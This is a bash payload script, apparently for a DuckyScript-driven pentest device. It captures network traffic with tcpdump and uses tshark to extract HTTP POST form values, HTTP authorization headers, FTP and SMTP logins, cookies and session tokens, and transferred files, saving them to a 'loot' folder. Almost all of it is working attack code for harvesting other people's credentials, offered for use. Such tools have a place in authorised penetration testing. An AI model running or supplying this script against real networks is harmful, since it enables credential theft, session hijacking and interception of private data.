#!/bin/bash
# Title: Deep Packet
# Author: bad-antics
# Description: Deep packet inspection with protocol analysis and credential extraction
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/deep-packet"
mkdir -p "$LOOT_DIR"

PROMPT "DEEP PACKET

Advanced packet capture
with protocol dissection.

Extracts:
- HTTP credentials
- DNS queries
- FTP/SMTP logins
- Cookie/session tokens
- File transfers
- TLS fingerprints

Press OK to configure."

IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
[ ! -d "/sys/class/net/$IFACE" ] && IFACE="wlan0"

PROMPT "CAPTURE MODE

1. Credential harvest
2. DNS intelligence
3. File extraction
4. Full protocol analysis
5. Stealth (passive only)

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

PROMPT "DURATION

Capture time in seconds.
Default: 120 (2 minutes)

Enter on next screen."

DURATION=$(NUMBER_PICKER "Seconds:" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PCAP="$LOOT_DIR/capture_${TIMESTAMP}.pcap"
REPORT="$LOOT_DIR/report_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START CAPTURE?

Interface: $IFACE
Mode: $MODE
Duration: ${DURATION}s

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "DeepPacket mode=$MODE iface=$IFACE dur=${DURATION}s"
SPINNER_START "Capturing packets..."

case $MODE in
    1) # Credential harvest
        timeout "$DURATION" tcpdump -i "$IFACE" -w "$PCAP" \
            'port 80 or port 8080 or port 21 or port 25 or port 110 or port 143 or port 23' \
            2>/dev/null

        # Extract HTTP POST data (potential credentials)
        tshark -r "$PCAP" -Y "http.request.method==POST" \
            -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value \
            2>/dev/null > "$LOOT_DIR/http_posts_${TIMESTAMP}.txt"

        # Extract HTTP auth headers
        tshark -r "$PCAP" -Y "http.authorization" \
            -T fields -e ip.src -e http.host -e http.authorization \
            2>/dev/null > "$LOOT_DIR/http_auth_${TIMESTAMP}.txt"

        # FTP credentials
        tshark -r "$PCAP" -Y "ftp.request.command==USER || ftp.request.command==PASS" \
            -T fields -e ip.src -e ftp.request.command -e ftp.request.arg \
            2>/dev/null > "$LOOT_DIR/ftp_creds_${TIMESTAMP}.txt"

        # SMTP
        tshark -r "$PCAP" -Y "smtp.req.command==AUTH" \
            -T fields -e ip.src -e smtp.req.parameter \
            2>/dev/null > "$LOOT_DIR/smtp_auth_${TIMESTAMP}.txt"

        HTTP_POSTS=$(wc -l < "$LOOT_DIR/http_posts_${TIMESTAMP}.txt" 2>/dev/null)
        HTTP_AUTH=$(wc -l < "$LOOT_DIR/http_auth_${TIMESTAMP}.txt" 2>/dev/null)
        FTP_CREDS=$(wc -l < "$LOOT_DIR/ftp_creds_${TIMESTAMP}.txt" 2>/dev/null)
        echo "HTTP Posts: $HTTP_POSTS | Auth: $HTTP_AUTH | FTP: $FTP_CREDS" > "$REPORT"
        ;;

    2) # DNS intelligence
        timeout "$DURATION" tcpdump -i "$IFACE" -w "$PCAP" 'port 53' 2>/dev/null
        tshark -r "$PCAP" -Y "dns.qry.name" \
            -T fields -e ip.src -e dns.qry.name -e dns.qry.type \
            2>/dev/null | sort | uniq -c | sort -rn > "$LOOT_DIR/dns_queries_${TIMESTAMP}.txt"
        # Detect DNS tunneling (long subdomains)
        awk '{if(length($3)>50) print "TUNNEL?", $0}' "$LOOT_DIR/dns_queries_${TIMESTAMP}.txt" \
            > "$LOOT_DIR/dns_suspicious_${TIMESTAMP}.txt" 2>/dev/null
        ;;

    3) # File extraction
        timeout "$DURATION" tcpdump -i "$IFACE" -w "$PCAP" 'port 80 or port 443 or port 21' 2>/dev/null
        mkdir -p "$LOOT_DIR/extracted_${TIMESTAMP}"
        tshark -r "$PCAP" --export-objects "http,$LOOT_DIR/extracted_${TIMESTAMP}" 2>/dev/null
        FILE_COUNT=$(ls "$LOOT_DIR/extracted_${TIMESTAMP}" 2>/dev/null | wc -l)
        echo "Extracted files: $FILE_COUNT" > "$REPORT"
        ;;

    4) # Full protocol analysis
        timeout "$DURATION" tcpdump -i "$IFACE" -w "$PCAP" 2>/dev/null
        TOTAL=$(tshark -r "$PCAP" 2>/dev/null | wc -l)
        tshark -r "$PCAP" -z "io,phs" -q 2>/dev/null > "$LOOT_DIR/protocols_${TIMESTAMP}.txt"
        tshark -r "$PCAP" -z "conv,ip" -q 2>/dev/null > "$LOOT_DIR/conversations_${TIMESTAMP}.txt"
        tshark -r "$PCAP" -z "endpoints,ip" -q 2>/dev/null > "$LOOT_DIR/endpoints_${TIMESTAMP}.txt"
        echo "Total packets: $TOTAL" > "$REPORT"
        ;;

    5) # Stealth passive
        timeout "$DURATION" tcpdump -i "$IFACE" -w "$PCAP" -p 2>/dev/null
        tshark -r "$PCAP" -Y "http.cookie" -T fields -e ip.src -e http.host -e http.cookie \
            2>/dev/null > "$LOOT_DIR/cookies_${TIMESTAMP}.txt"
        tshark -r "$PCAP" -Y "tls.handshake.extensions_server_name" \
            -T fields -e ip.src -e tls.handshake.extensions_server_name \
            2>/dev/null | sort -u > "$LOOT_DIR/tls_sni_${TIMESTAMP}.txt"
        ;;
esac

SPINNER_STOP

PCAP_SIZE=$(du -h "$PCAP" 2>/dev/null | cut -f1)
PKT_COUNT=$(tshark -r "$PCAP" 2>/dev/null | wc -l)

# Compile final report
cat >> "$REPORT" << EOF

=== DeepPacket Report ===
Date:     $(date)
Mode:     $MODE
Duration: ${DURATION}s
Packets:  $PKT_COUNT
PCAP:     $PCAP_SIZE
Interface: $IFACE
EOF

PROMPT "CAPTURE COMPLETE

Packets: $PKT_COUNT
Size: $PCAP_SIZE

Files saved to:
deep-packet/

Press OK to exit."
